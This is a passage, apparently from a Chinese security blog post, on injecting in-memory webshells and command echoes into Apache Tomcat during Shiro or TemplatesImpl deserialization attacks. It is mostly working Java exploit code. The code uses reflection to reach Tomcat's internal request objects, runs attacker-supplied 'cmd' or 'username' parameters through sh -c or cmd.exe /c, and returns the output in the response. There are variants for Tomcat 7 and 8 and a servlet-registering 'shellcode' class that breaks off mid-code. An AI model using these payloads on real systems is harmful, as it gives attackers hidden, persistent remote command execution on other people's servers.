+<div class="code-wrapper"><pre><code class="hljs xl">W<span class="hljs-function"><span class="hljs-title">ebappClassLoaderBase</span> ---&gt;</span> A<span class="hljs-function"><span class="hljs-title">pplicationContext</span>(getResources().getContext()) ---&gt;</span> S<span class="hljs-function"><span class="hljs-title">tandardService</span>---&gt;</span>C<span class="hljs-function"><span class="hljs-title">onnector</span>---&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractProtocol</span>$ConnectoinHandler---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestGroupInfo</span>(global)---&gt;</span>R<span class="hljs-function"><span class="hljs-title">equestInfo</span>-------&gt;</span>R<span class="hljs-function"><span class="hljs-title">equest</span>--------&gt;</span>Response</code></pre></div>
+
+<p>注意最后拿到的Request对象是<code>org.apache.coyote.Request</code>，而真正需要其实是<code>org.apache.catalina.connector.Request</code>对象，前者是是应用层对于请求-响应对象的底层实现，并不方便使用，通过调用其getNote方法可以得到后者</p>
+<p>github上的代码（这里测试的是shiro环境，会有tomcat的header长度限制，所以可以先反射修改maxHeaderSize</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>;
+org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.get<span class="hljs-constructor">Resources()</span>.get<span class="hljs-constructor">Context()</span>;
+
+Field contextField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;context&quot;</span>)</span>;
+contextField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)contextField.get(standardContext);
+
+Field serviceField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;service&quot;</span>)</span>;
+serviceField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService)serviceField.get(ApplicationContext);
+
+Field connectorsField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.catalina.core.StandardService&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;connectors&quot;</span>)</span>;
+connectorsField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+org.apache.catalina.connector.Connector<span class="hljs-literal">[]</span> connectors = (org.apache.catalina.connector.Connector<span class="hljs-literal">[]</span>)connectorsField.get(standardService);
+
+org.apache.coyote.ProtocolHandler protocolHandler = connectors<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.get<span class="hljs-constructor">ProtocolHandler()</span>;
+Field handlerField = org.apache.coyote.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractProtocol</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;handler&quot;</span>)</span>;
+handlerField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);
+
+Field globalField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;global&quot;</span>)</span>;
+globalField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);
+
+Field processors = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;processors&quot;</span>)</span>;
+processors.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+java.util.List&lt;RequestInfo&gt; RequestInfolist = (java.util.List&lt;RequestInfo&gt;) processors.get(global);
+
+Field req = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>)</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;req&quot;</span>)</span>;
+req.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+<span class="hljs-keyword">for</span> (RequestInfo requestInfo : RequestInfolist) &#123;
+    org.apache.coyote.Request request1 = (org.apache.coyote.Request )req.get(requestInfo);
+    org.apache.catalina.connector.Request request2 = ( org.apache.catalina.connector.Request)request1.get<span class="hljs-constructor">Note(1)</span>;
+    org.apache.catalina.connector.Response response2 = request2.get<span class="hljs-constructor">Response()</span>;
+    java.io.Writer w = response2.get<span class="hljs-constructor">Writer()</span>;
+
+    String cmd = request2.get<span class="hljs-constructor">Parameter(<span class="hljs-string">&quot;cmd&quot;</span>)</span>;
+    boolean isLinux = <span class="hljs-literal">true</span>;
+    String osTyp = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>;
+    <span class="hljs-keyword">if</span> (osTyp != null<span class="hljs-operator"> &amp;&amp; </span>osTyp.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+        isLinux = <span class="hljs-literal">false</span>;
+    &#125;
+    String<span class="hljs-literal">[]</span> cmds = isLinux ? <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> String<span class="hljs-literal">[]</span>&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;
+    InputStream <span class="hljs-keyword">in</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(cmds).get<span class="hljs-constructor">InputStream()</span>;
+    Scanner s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Scanner(<span class="hljs-params">in</span>)</span>.use<span class="hljs-constructor">Delimiter(<span class="hljs-string">&quot;\\a&quot;</span>)</span>;
+    String output = s.has<span class="hljs-constructor">Next()</span> ? s.next<span class="hljs-literal">()</span> : <span class="hljs-string">&quot;&quot;</span>;
+    w.write(output);
+    w.flush<span class="hljs-literal">()</span>;
+
+    Field responseField = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ResponseFacade</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;response&quot;</span>)</span>;
+    responseField.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    Field usingWriter = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Response</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-string">&quot;usingWriter&quot;</span>)</span>;
+    usingWriter.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+    usingWriter.set(response2, Boolean.FALSE);
+&#125;</code></pre></div>
 
 
+
+<h3 id="从上一篇中的存储了request的另一个点进行分析"><a href="#从上一篇中的存储了request的另一个点进行分析" class="headerlink" title="从上一篇中的存储了request的另一个点进行分析"></a>从上一篇中的存储了request的另一个点进行分析</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7535">https://xz.aliyun.com/t/7535</a></p>
+<p><img src="/../images/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20240229121030031.png" srcset="/img/loading.gif" lazyload alt="image-20240229121030031"></p>
+<p>tomcat7,8获取这条链的方式大同小异，变化之处在于<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio</p>
+<p>tomcat8</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+<span class="hljs-keyword">import</span> org.apache.coyote.Request;
+<span class="hljs-keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;
+<span class="hljs-keyword">import</span> org.apache.tomcat.util.modeler.Registry;
+<span class="hljs-keyword">import</span> javax.management.MBeanServer;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tomcat82</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">tomcat82</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-keyword">try</span>&#123;
+            <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbeanServer</span> <span class="hljs-operator">=</span> Registry.getRegistry((Object)<span class="hljs-literal">null</span>, (Object)<span class="hljs-literal">null</span>).getMBeanServer();
+            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;mbsInterceptor&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(mbeanServer);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;repository&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;domainTb&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">HashMap</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> (HashMap)field.get(obj);
+            obj = ((HashMap)obj2.get(<span class="hljs-string">&quot;Catalina&quot;</span>)).get(<span class="hljs-string">&quot;name=\&quot;http-nio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;object&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;resource&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">ArrayList</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> (ArrayList)field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+
+            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
+            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);
+            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+                isLinux = <span class="hljs-literal">false</span>;
+            &#125;
+
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; obj3.size(); i++) &#123;
+                <span class="hljs-type">Request</span> <span class="hljs-variable">obj4</span> <span class="hljs-operator">=</span> (Request) field.get(obj3.get(i));
+                <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> obj4.getParameters().getParameter(<span class="hljs-string">&quot;username&quot;</span>);
+                <span class="hljs-keyword">if</span>(username != <span class="hljs-literal">null</span>)&#123;
+                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, username&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,  username&#125;;
+                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();
+                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);
+                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
+                    <span class="hljs-keyword">while</span> (s.hasNext())&#123;
+                        output += s.next();
+                    &#125;
+
+                    <span class="hljs-type">byte</span>[] buf = output.getBytes();
+                    <span class="hljs-type">ByteChunk</span> <span class="hljs-variable">bc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteChunk</span>();
+                    bc.setBytes(buf, <span class="hljs-number">0</span>, buf.length);
+                    obj4.getResponse().doWrite(bc);
+                    <span class="hljs-keyword">break</span>;
+                &#125;
+            &#125;
+
+        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+<p>tomcat7</p>
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+<span class="hljs-keyword">import</span> org.apache.coyote.Request;
+<span class="hljs-keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;
+<span class="hljs-keyword">import</span> org.apache.tomcat.util.modeler.Registry;
+
+<span class="hljs-keyword">import</span> javax.management.MBeanServer;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.util.ArrayList;
+<span class="hljs-keyword">import</span> java.util.HashMap;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">tomcat72</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">tomcat72</span><span class="hljs-params">()</span>&#123;
+        <span class="hljs-keyword">try</span>&#123;
+
+            <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbeanServer</span> <span class="hljs-operator">=</span> Registry.getRegistry((Object)<span class="hljs-literal">null</span>, (Object)<span class="hljs-literal">null</span>).getMBeanServer();
+            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;mbsInterceptor&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> field.get(mbeanServer);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;repository&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;domainTb&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">HashMap</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> (HashMap)field.get(obj);
+            obj = ((HashMap)obj2.get(<span class="hljs-string">&quot;Catalina&quot;</span>)).get(<span class="hljs-string">&quot;name=\&quot;http-bio-8888\&quot;,type=GlobalRequestProcessor&quot;</span>);
+
+            field = Class.forName(<span class="hljs-string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;object&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;resource&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            obj = field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;processors&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+            <span class="hljs-type">ArrayList</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> (ArrayList)field.get(obj);
+
+            field = Class.forName(<span class="hljs-string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;req&quot;</span>);
+            field.setAccessible(<span class="hljs-literal">true</span>);
+
+            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
+            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);
+            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;
+                isLinux = <span class="hljs-literal">false</span>;
+            &#125;
+
+            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; obj3.size(); i++) &#123;
+                <span class="hljs-type">Request</span> <span class="hljs-variable">obj4</span> <span class="hljs-operator">=</span> (Request) field.get(obj3.get(i));
+                <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> obj4.getParameters().getParameter(<span class="hljs-string">&quot;username&quot;</span>);
+                <span class="hljs-keyword">if</span>(username != <span class="hljs-literal">null</span>)&#123;
+                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, username&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>,  username&#125;;
+                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();
+                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);
+                    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
+                    <span class="hljs-keyword">while</span> (s.hasNext())&#123;
+                        output += s.next();
+                    &#125;
+
+                    <span class="hljs-type">byte</span>[] buf = output.getBytes();
+                    <span class="hljs-type">ByteChunk</span> <span class="hljs-variable">bc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteChunk</span>();
+                    bc.setBytes(buf, <span class="hljs-number">0</span>, buf.length);
+                    obj4.getResponse().doWrite(bc);
+                    <span class="hljs-keyword">break</span>;
+                &#125;
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+<span class="hljs-comment">//            System.out.println(&quot;=======================&quot;);</span>
+<span class="hljs-comment">//            System.out.println(e);</span>
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;
+
+    &#125;
+&#125;</code></pre></div>
+
+<h2 id="结合连续剧原理的有关TemplatesImpl的poc"><a href="#结合连续剧原理的有关TemplatesImpl的poc" class="headerlink" title="结合连续剧原理的有关TemplatesImpl的poc"></a>结合连续剧原理的有关TemplatesImpl的poc</h2><p>具体的什么类型的马可以自行根据前面原理实现不同接口</p>
+<p>反正我们能通过下面两种方式获取通用的request和response对象</p>
+<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+<span class="hljs-keyword">import</span> org.apache.catalina.<span class="hljs-keyword">Wrapper</span>;
+<span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;
+<span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;
+
+<span class="hljs-keyword">import</span> javax.servlet.*;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.io.PrintWriter;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;
+<span class="hljs-keyword">import</span> java.util.Scanner;
+
+<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> shellcode extends AbstractTranslet implements Servlet&#123;
+
+    static &#123;
+        try &#123;
+            <span class="hljs-keyword">Class</span>&lt;?&gt; clazz = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);
+            Field WRAP_SAME_OBJECT = <span class="hljs-keyword">Class</span>.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequest = clazz.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponse = clazz.getDeclaredField(&quot;lastServicedResponse&quot;);
+            Field modifiers = Field.<span class="hljs-keyword">class</span>.getDeclaredField(&quot;modifiers&quot;);
+            modifiers.setAccessible(<span class="hljs-keyword">true</span>);
+            // 去掉final修饰符，设置访问权限
+            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~Modifier.FINAL);
+            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);
+            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);
+            WRAP_SAME_OBJECT.setAccessible(<span class="hljs-keyword">true</span>);
+            lastServicedRequest.setAccessible(<span class="hljs-keyword">true</span>);
+            lastServicedResponse.setAccessible(<span class="hljs-keyword">true</span>);
+            // 修改 WRAP_SAME_OBJECT 并且初始化 lastServicedRequest 和 lastServicedResponse
+            <span class="hljs-keyword">if</span> (!WRAP_SAME_OBJECT.getBoolean(<span class="hljs-keyword">null</span>)) &#123;
+                WRAP_SAME_OBJECT.setBoolean(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>);
+                lastServicedRequest.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">null</span>, <span class="hljs-built_in">new</span> ThreadLocal&lt;ServletRequest&gt;());
+                lastServicedResponse.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">null</span>, <span class="hljs-built_in">new</span> ThreadLocal&lt;ServletResponse&gt;());
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                String <span class="hljs-type">name</span> = &quot;xxx&quot;;
+                //从req中获取ServletContext对象
+                // 第二次请求后进入 <span class="hljs-keyword">else</span> 代码块，获取 Request 和 Response 对象，写入回显
+                ThreadLocal&lt;ServletRequest&gt; threadLocalReq = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">null</span>);
+                ThreadLocal&lt;ServletResponse&gt; threadLocalResp = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponse.<span class="hljs-keyword">get</span>(<span class="hljs-keyword">null</span>);
+                ServletRequest servletRequest = threadLocalReq.<span class="hljs-keyword">get</span>();
+                ServletResponse servletResponse = threadLocalResp.<span class="hljs-keyword">get</span>();
+
+                ServletContext servletContext = servletRequest.getServletContext();
+
+
+                <span class="hljs-keyword">if</span> (servletContext.getServletRegistration(<span class="hljs-type">name</span>) == <span class="hljs-keyword">null</span>) &#123;
+                    StandardContext o = <span class="hljs-keyword">null</span>;
+
+                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
+                    <span class="hljs-keyword">while</span> (o == <span class="hljs-keyword">null</span>) &#123;
+                        Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);
+                        f.setAccessible(<span class="hljs-keyword">true</span>);
+                        <span class="hljs-keyword">Object</span> <span class="hljs-keyword">object</span> = f.<span class="hljs-keyword">get</span>(servletContext);
+
+                        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">object</span> instanceof ServletContext) &#123;
+                            servletContext = (ServletContext) <span class="hljs-keyword">object</span>;
+                        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">object</span> instanceof StandardContext) &#123;
+                            o = (StandardContext) <span class="hljs-keyword">object</span>;
+                        &#125;
+                    &#125;
+
+                    //自定义servlet
+                    Servlet servlet = <span class="hljs-built_in">new</span> shellcode();
+
+                    //用<span class="hljs-keyword">Wrapper</span>封装servlet
+                    <span class="hljs-keyword">Wrapper</span> newWrapper = o.createWrapper();
+                    newWrapper.setName(<span class="hljs-type">name</span>);
+                    newWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);
+                    newWrapper.setServlet(servlet);
+
+                    //向children中添加<span class="hljs-keyword">Wrapper</span>
